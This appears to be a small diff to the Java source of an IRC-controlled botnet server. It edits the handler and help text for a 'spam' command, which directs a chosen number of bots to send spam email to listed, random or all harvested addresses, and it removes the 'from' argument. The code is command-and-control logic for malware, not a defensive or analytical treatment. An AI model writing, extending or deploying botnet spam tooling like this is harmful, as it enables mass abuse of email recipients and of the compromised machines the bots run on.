@@ -249,8 +249,8 @@ public class BotnetServer extends PircBot {
 		//Respond to spam command by selecting numbots bots and issuing the command	
 		} else if (s.toLowerCase().startsWith("spam")) {
 			String[] parts = s.split(" ");
-			if (parts.length < 8) {
-				System.out.println("Usage: spam numBots xxx yyy zzz from subject recipient [more recipients]");
+			if (parts.length < 7) {
+				System.out.println("Usage: spam numBots xxx yyy zzz subject recipient [more recipients]");
 			} else {
 				int numBots = Integer.parseInt(parts[1]);
 				String[] bots = getUserNames();
@@ -340,7 +340,7 @@ public class BotnetServer extends PircBot {
 		System.out.println("\t\tGiving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to");
 		System.out.println("\t\ta random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, ");
 		System.out.println("\t\tthe number will not be respected if it exceeds the size of the botnet.");
-		System.out.println("\t\tUsage: spam numBots xxx yyy zzz from subject recipient [more recipients]");
+		System.out.println("\t\tUsage: spam numBots xxx yyy zzz subject recipient [more recipients]");
 	}
 	
 	/**
